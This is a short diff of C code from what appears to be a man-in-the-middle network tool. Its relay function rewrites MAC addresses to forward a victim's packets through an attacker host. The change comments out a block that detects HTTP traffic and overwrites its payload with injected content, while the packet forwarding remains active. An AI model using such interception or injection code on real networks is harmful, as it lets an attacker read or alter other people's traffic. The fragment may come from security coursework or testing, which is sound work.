@@ -102,16 +102,16 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
             {
                 copy_mac(gate_mac, pkt->eth_.dmac_);
                 copy_mac(attacker_mac, pkt->eth_.smac_);
-                if (pkt->eth_.type_ == htons(EthHdr::Ip4) && ippkt->ip_protocol == 6)
-                {
-                    if (check_http(payload))
-                    {
-                        printf("http!\n");
-                        copy_ip(infect_destip, ippkt->ip_dest);
-                        fix_len(&((ip_hdr *)(packet + 14))->ip_len, htons(0x0205));
-                        copy_payload(modify, (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset));
-                    }
-                }
+                // if (pkt->eth_.type_ == htons(EthHdr::Ip4) && ippkt->ip_protocol == 6)
+                // {
+                //     if (check_http(payload))
+                //     {
+                //         printf("http!\n");
+                //         copy_ip(infect_destip, ippkt->ip_dest);
+                //         fix_len(&((ip_hdr *)(packet + 14))->ip_len, htons(0x0205));
+                //         copy_payload(modify, (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset));
+                //     }
+                // }
                 int res = pcap_sendpacket(pcap, (u_char *)packet, header->len);
                 continue;
                 if (res != 0)
